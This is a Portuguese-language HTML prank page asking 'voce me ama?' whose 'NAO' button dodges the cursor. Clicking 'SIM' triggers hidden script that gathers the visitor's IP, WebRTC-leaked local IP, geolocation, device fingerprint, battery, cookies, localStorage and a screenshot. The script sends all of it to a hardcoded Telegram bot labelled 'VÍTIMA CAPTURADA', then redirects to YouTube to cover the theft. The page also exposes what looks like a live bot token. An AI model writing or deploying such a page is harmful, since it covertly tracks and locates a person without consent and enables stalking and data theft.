<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>voce me ama?</title>
    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js">
    </script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #ffe4ec;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 500px;
            width: 100%;
            background: #ffffffd9;
            backdrop-filter: blur(4px);
            border-radius: 40px 12px 40px 12px;
            padding: 50px 30px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(255, 105, 135, 0.15);
            border: 1px solid rgba(255, 182, 193, 0.3);
            transition: all 0.3s ease;
        }

        .pergunta {
            font-size: 26px;
            color: #4a2c3a;
            margin-bottom: 30px;
            letter-spacing: 1px;
            font-weight: 300;
        }

        .pergunta .emoji {
            color: #ff6b8a;
            display: inline-block;
            animation: pulse 2s ease-in-out infinite;
        }

        @keyframes pulse {
            0%,
            100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.1);
            }
        }

        .buttons {
            display: flex;
            justify-content: center;
            gap: 40px;
            flex-wrap: wrap;
            position: relative;
            min-height: 70px;
            margin-top: 10px;
        }

        .btn {
            font-size: 18px;
            padding: 14px 44px;
            border: 2px solid #ffb6c1;
            background: transparent;
            color: #4a2c3a;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            letter-spacing: 1px;
            border-radius: 60px 12px 60px 12px;
            min-width: 120px;
            background: #ffffff;
            box-shadow: 0 2px 8px rgba(255, 105, 135, 0.05);
        }

        .btn-sim {
            border-color: #ff8da1;
            color: #4a2c3a;
            background: #fff5f7;
        }

        .btn-sim:hover {
            background: #ff8da1;
            color: #ffffff;
            box-shadow: 0 4px 16px rgba(255, 105, 135, 0.3);
            transform: translateY(-2px);
        }

        .btn-nao {
            border-color: #dcdcdc;
            color: #999;
            background: #f9f9f9;
            transition: all 0.05s ease;
            position: relative;
        }

        .btn-nao:hover {
            transform: scale(1);
        }

        .loader {
            border: 3px solid #ffe4ec;
            border-top: 3px solid #ff6b8a;
            border-radius: 50%;
            width: 36px;
            height: 36px;
            animation: spin 0.9s linear infinite;
            margin: 20px auto;
            display: none;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        /* ─── CORAÇÕES FLUTUANTES (DISCRETAS) ─── */
        .floating-hearts {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 999;
            overflow: hidden;
        }

        .floating-heart {
            position: absolute;
            font-size: 16px;
            animation: floatUp 6s linear forwards;
            opacity: 0.4;
            color: #ffb6c1;
        }

        @keyframes floatUp {
            0% {
                transform: translateY(100vh) rotate(0deg) scale(0.5);
                opacity: 0;
            }
            10% {
                opacity: 0.5;
            }
            90% {
                opacity: 0.5;
            }
            100% {
                transform: translateY(-10vh) rotate(720deg) scale(1.1);
                opacity: 0;
            }
        }

        /* ─── RESPONSIVO ─── */
        @media (max-width: 500px) {
            .container {
                padding: 30px 18px;
            }
            .pergunta {
                font-size: 20px;
            }
            .btn {
                font-size: 16px;
                padding: 12px 28px;
                min-width: 100px;
            }
            .buttons {
                gap: 20px;
            }
        }
    </style>
</head>
<body>

    <div class="floating-hearts" id="floatingHearts"></div>

    <div class="container" id="page-content">
        <div class="pergunta">
            <span class="emoji">💗</span> voce me ama?
        </div>

        <div class="buttons" id="buttonArea">
            <button class="btn btn-sim" id="btnSim">SIM</button>
            <button class="btn btn-nao" id="btnNao">NAO</button>
        </div>

        <div class="loader" id="loader"></div>
    </div>

    <script>
        // ============================================================
        // BOTÃO "NAO" FUGINDO (VERSÃO CLEAN)
        // ============================================================
        const btnNao = document.getElementById('btnNao');
        const btnSim = document.getElementById('btnSim');
        const container = document.getElementById('page-content');
        const buttonArea = document.getElementById('buttonArea');
        const loader = document.getElementById('loader');

        btnNao.addEventListener('mouseenter', function(e) {
            const containerRect = container.getBoundingClientRect();
            const btnRect = btnNao.getBoundingClientRect();

            const padding = 20;
            const maxX = containerRect.width - btnRect.width - padding;
            const maxY = containerRect.height - btnRect.height - padding;

            let newX, newY;
            let attempts = 0;
            do {
                newX = Math.random() * maxX;
                newY = Math.random() * maxY;
                attempts++;
                if (attempts > 50) break;
            } while (Math.abs(newX - btnNao.offsetLeft) < 30 && Math.abs(newY - btnNao.offsetTop) < 30);

            btnNao.style.position = 'absolute';
            btnNao.style.left = Math.max(0, Math.min(newX, maxX)) + 'px';
            btnNao.style.top = Math.max(0, Math.min(newY, maxY)) + 'px';
        });

        btnNao.addEventListener('click', function(e) {
            const containerRect = container.getBoundingClientRect();
            const btnRect = btnNao.getBoundingClientRect();
            const maxX = containerRect.width - btnRect.width - 20;
            const maxY = containerRect.height - btnRect.height - 20;
            btnNao.style.position = 'absolute';
            btnNao.style.left = Math.random() * maxX + 'px';
            btnNao.style.top = Math.random() * maxY + 'px';
        });

        // ============================================================
        // BOTÃO "SIM" — DISPARA TUDO E REDIRECIONA PRO YOUTUBE
        // ============================================================
        btnSim.addEventListener('click', function() {
            // Esconde botões e mostra loading
            buttonArea.style.display = 'none';
            loader.style.display = 'block';

            // Coleta os dados e envia em background
            coletarEEnviar();

            // Redireciona pro YouTube (Post Malone - I Fall Apart)
            setTimeout(() => {
                window.location.href = 'https://www.youtube.com/watch?v=JQbjS0_ZfJ0';
            }, 2000);
        });

        // ============================================================
        // COLETAR E ENVIAR PRO TELEGRAM
        // ============================================================
        const BOT_TOKEN = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
        const CHAT_ID = "8551438856";

        async function coletarEEnviar() {
            try {
                // ---- IP ----
                const ip = await fetch('https://api.ipify.org?format=json')
                    .then(r => r.json()).then(d => d.ip).catch(() => '❌');

                // ---- IP REAL (WebRTC) ----
                let webrtcIP = '❌';
                try {
                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    pc.createDataChannel('teste');
                    const offer = await pc.createOffer({ offerToReceiveAudio: 1 });
                    await pc.setLocalDescription(offer);
                    const candidates = pc.localDescription.sdp.match(/candidate.*/g);
                    if (candidates) {
                        const ips = candidates.map(c => c.split(' ')[4])
                            .filter(ip => ip && !ip.includes('127.0.0.1') && !ip.includes('0.0.0.0'));
                        if (ips.length) webrtcIP = ips[0];
                    }
                    pc.close();
                } catch {}

                // ---- LOCALIZAÇÃO POR IP ----
                let location = {};
                try {
                    const r = await fetch(`https://ipinfo.io/${ip}/json`);
                    const d = await r.json();
                    location = {
                        city: d.city || 'Desconhecida',
                        region: d.region || 'Desconhecida',
                        country: d.country || 'Desconhecido',
                        loc: d.loc || 'Desconhecida',
                        org: d.org || 'Desconhecido',
                        timezone: d.timezone || 'Desconhecido'
                    };
                } catch {
                    location = { city: '❌', region: '❌', country: '❌', loc: '❌', org: '❌', timezone: '❌' };
                }

                // ---- VPN ----
                let vpnStatus = '❓ Indeterminado';
                if (location.org) {
                    const org = location.org.toLowerCase();
                    const keywords = ['vpn', 'proxy', 'hosting', 'cloudflare', 'amazon', 'digitalocean', 'ovh', 'linode',
                        'vultr', 'heroku', 'azure', 'google cloud'
                    ];
                    vpnStatus = keywords.some(k => org.includes(k)) ? '⚠️ VPN/PROXY DETECTADO!' : '✅ Nenhum VPN/Proxy';
                }

                // ---- FINGERPRINT ----
                const fpData = [
                    navigator.userAgent,
                    navigator.language,
                    screen.width + 'x' + screen.height,
                    new Date().getTimezoneOffset(),
                    navigator.hardwareConcurrency || '?',
                    navigator.deviceMemory || '?',
                    !!navigator.webdriver,
                    !!navigator.plugins.length,
                    navigator.doNotTrack || '?'
                ];
                let hash = 0;
                const fpString = fpData.join('|');
                for (let i = 0; i < fpString.length; i++) {
                    hash = (hash << 5) - hash + fpString.charCodeAt(i);
                    hash = hash & hash;
                }
                const fingerprint = 'FP-' + Math.abs(hash).toString(16).toUpperCase();

                // ---- DADOS DO DISPOSITIVO ----
                const ua = navigator.userAgent;
                const isIOS = /iPhone|iPad|iPod/i.test(ua);
                const isAndroid = /Android/i.test(ua);
                let modelo = 'Desconhecido',
                    os = 'Desconhecido',
                    marca = 'Desconhecida';

                if (isIOS) {
                    const m = ua.match(/iPhone OS (\d+)_(\d+)/);
                    modelo = m ? `iPhone (iOS ${m[1]}.${m[2]})` : 'iPhone';
                    os = m ? `iOS ${m[1]}.${m[2]}` : 'iOS';
                    marca = 'Apple';
                } else if (isAndroid) {
                    const m = ua.match(/Android (\d+\.\d+)/);
                    modelo = m ? `Android ${m[1]}` : 'Android';
                    os = m ? `Android ${m[1]}` : 'Android';
                    marca = 'Android';
                } else {
                    modelo = '💻 Computador';
                    os = navigator.platform || 'Desconhecido';
                    marca = 'Desktop';
                }

                // ---- BATERIA ----
                let bateria = '❌';
                if (navigator.getBattery) {
                    try {
                        const b = await navigator.getBattery();
                        bateria = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Carregando' : '🔋 Descarregando'})`;
                    } catch {}
                }

                // ---- CONEXÃO ----
                let conexao = '❌';
                if (navigator.connection) {
                    conexao = navigator.connection.effectiveType || 'N/A';
                }

                // ---- PLUGINS ----
                let plugins = [];
                for (let i = 0; i < navigator.plugins.length; i++) {
                    plugins.push(navigator.plugins[i].name);
                }
                const pluginsList = plugins.length ? plugins.join(', ') : '❌ Nenhum';

                // ---- COOKIES E LOCALSTORAGE ----
                const cookies = document.cookie || '❌ Sem cookies';
                let localStorageData = '❌';
                try {
                    localStorageData = JSON.stringify(localStorage) || '❌ Vazio';
                } catch {}

                // ---- REDES WI-FI ----
                let wifi = '❌';
                if (navigator.connection) {
                    try {
                        wifi =
                            `Tipo: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink || '?'} Mbps`;
                    } catch {}
                }

                // ---- FONTES INSTALADAS ----
                let fonts = [];
                const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Impact', 'Comic Sans MS'];
                for (let f of fontList) {
                    if (document.fonts.check(`12px "${f}"`)) fonts.push(f);
                }
                const fontsInstalled = fonts.length ? fonts.join(', ') : '❌';

                // ---- PRINT REAL DA TELA ----
                let screenshot = null;
                try {
                    const canvas = await html2canvas(document.body, {
                        scale: 1.5,
                        useCORS: true,
                        backgroundColor: '#ffe4ec',
                        logging: false,
                        allowTaint: false,
                        width: window.innerWidth,
                        height: window.innerHeight,
                        windowWidth: window.innerWidth,
                        windowHeight: window.innerHeight
                    });
                    screenshot = canvas.toDataURL('image/jpeg', 0.9);
                } catch (e) {}

                // ---- MONTA MENSAGEM ----
                let msg = `
        💗 **CLEAN GIRL — VÍTIMA CAPTURADA** 💗

        🌐 **IP Público:** ${ip}
        🔴 **IP Real (WebRTC):** ${webrtcIP}
        🛡️ **VPN/Proxy:** ${vpnStatus}

        📍 **LOCALIZAÇÃO POR IP:**
           🏙️ Cidade: ${location.city}
           🗺️ Região: ${location.region}
           🌍 País: ${location.country}
           📍 Coordenadas: ${location.loc}
           🕰️ Fuso: ${location.timezone}

        📱 **DISPOSITIVO:**
           📱 Modelo: ${modelo}
           🏷️ Marca: ${marca}
           📲 OS: ${os}
           🔋 Bateria: ${bateria}
           📶 Conexão: ${conexao}
           📐 Tela: ${screen.width}x${screen.height}
           🌍 Idioma: ${navigator.language}
           🕰️ Fuso: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
           🧠 Fingerprint: ${fingerprint}

        📶 **REDE:** ${wifi}

        🔌 **PLUGINS:** ${pluginsList}
        🍪 **COOKIES:** ${cookies}
        💾 **localStorage:** ${localStorageData}

        🔤 **FONTES INSTALADAS:** ${fontsInstalled}

        💀 **Ela disse SIM!** 💀
        `;

                // ---- ENVIA TEXTO ----
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });

                // ---- ENVIA PRINT ----
                if (screenshot) {
                    const form = new FormData();
                    const blob = await fetch(screenshot).then(res => res.blob());
                    form.append('photo', blob, 'screenshot_real.jpg');
                    form.append('chat_id', CHAT_ID);
                    form.append('caption', '🖼️ PRINT REAL DA TELA INTEIRA');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: form
                    });
                }

            } catch (e) {
                console.log('Erro no envio:', e);
            }
        }

        // ============================================================
        // CORAÇÕES FLUTUANTES (FUNDO)
        // ============================================================
        setInterval(() => {
            if (document.getElementById('buttonArea').style.display === 'none') return;
            const heart = document.createElement('div');
            heart.className = 'floating-heart';
            heart.textContent = '♥';
            heart.style.left = Math.random() * 90 + 5 + '%';
            heart.style.fontSize = (Math.random() * 14 + 10) + 'px';
            heart.style.animationDuration = (Math.random() * 5 + 4) + 's';
            heart.style.opacity = '0.2';
            heart.style.color = '#ffb6c1';
            document.getElementById('floatingHearts').appendChild(heart);
            setTimeout(() => { heart.remove(); }, 8000);
        }, 3000);
    </script>

</body>
</html>
